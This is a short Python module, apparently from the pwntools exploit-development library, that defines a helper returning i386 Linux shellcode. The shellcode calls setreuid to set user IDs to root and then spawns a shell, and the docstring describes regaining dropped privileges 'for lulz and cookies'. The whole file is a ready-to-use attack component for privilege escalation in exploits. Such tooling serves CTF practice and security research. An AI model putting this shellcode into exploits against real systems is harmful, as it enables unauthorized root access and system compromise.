from pwn.shellcode_helper import *
from .. import sh

@shellcode_reqs(arch='i386', os='linux')
def setresuidsh():
    """ Sets real and effective user ID (setreuid) to 0 and spawns a shell.
Usefull when a privileged process drops it's privileges and we want them back for lulz and cookies!
"""
    return """
xor ecx, ecx
imul ecx
xor ebx, ebx
mov al, SYS_setreuid
int 0x80
""", sh(False)
